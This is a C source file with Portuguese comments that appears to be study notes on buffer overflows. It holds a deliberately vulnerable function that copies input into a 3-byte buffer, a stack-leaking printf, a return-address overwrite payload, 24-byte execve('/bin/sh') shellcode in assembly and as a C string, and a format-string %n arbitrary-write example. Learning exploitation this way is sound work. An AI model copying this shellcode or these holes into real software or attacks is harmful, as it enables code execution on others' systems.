
// clear; gcc -Wall strcpy.c -o strcpy.elf && ./strcpy.elf

// copia uma string em outra (origem para destino).
// Retorna destino.

// #include<string.h> // = = = = = = = = = = = = = = = = = = = = = = = =
//extern char *strcpy(char *destino, char *origem);

// Copy SRC to DEST.
unsigned char *strcpy (const unsigned char *dest, const unsigned char *src) {
   unsigned char *s, *d;
   
   s = (unsigned char *)src;
   d = (unsigned char *)dest;
   
   for (;;) {
      d[0] = s[0];
      if (s[0] == 0x00) break;
      s++; d++;
   }
   
   return (unsigned char *)dest;
}

// #include<stdio.h> // = = = = = = = = = = = = = = = = = = = = = = = =
extern int printf(char *, ...);

void bo1(const unsigned char *FILENAME) {
   unsigned char buff[3];
   strcpy(buff, FILENAME);
   printf("Teste:\n%s\n",buff);
}

int main() {
   unsigned char teste[] = "Isso é um teste";
   printf("%s\n", "Viewing the stack:");
   printf("%x\n%x\n%x\n%x\n%x\n%x\n\n");

   bo1(teste);
   
   printf("Terminei.\n");
   return(0);
}

/*
strcpy (c, b);
sprintf (c, “%s”, b);
strcat (c, b);
gets (c);
podem causar buffer overflow, devido à falta de verificação de limite

Exploid:
If the FILENAME is longer than 3 bytes, the strcpy function will write past the end of the buf[] array.
É possível executar um código arbitrário usando buff e até ganhar o shell. (Analise a pilha feita pelo programa para chamar a função.)
*/

/*
bo1("aaaaaaabbbb\x78\x56\x34\x12");
Return address is overwritten with 0x12345678
*/

// injete o comando   execve("/bin/sh", 0, 0);

/*
         Linux Shellcode in 24 bytes
shellcode.c
char *argv[] = { "/bin/sh", 0x00 }
execve(argv[0], argv, 0x00);


shellcode.asm
xor eax, eax  ; eax = 0
; filename
push eax      ; push 0
push '//sh'
push '/bin'
mov ebx, esp  ; ebx = "/bin/sh"
push eax      ; push 0
push ebx      ; push "/bin/sh"
mov ecx, esp  ; ecx = argv
cdq           ; edx = 0
mov al, 0x0b  ; eax = 0x0b
int 0x80


shellcode as a C string
char shellcode[] =
  "\x31\xc0\x50\x68//sh"
  "\x68/bin\x89\xe3\x50"
  "\x53\x89\xe1\x99\xb0"
  "\x0b\xcd\x80";


  Overwriting arbitrary memory location:
  printf("\x78\x56\x34\x12 %x%x%x%x %n");

  The first four bytes are the address to overwrite.
  The %x formats pop arguments off the stack until we reach the format string.
  The %n format writes the number of characters we've output so far to a location indicated by the next argument, which happens to be 0x12345678.

*/


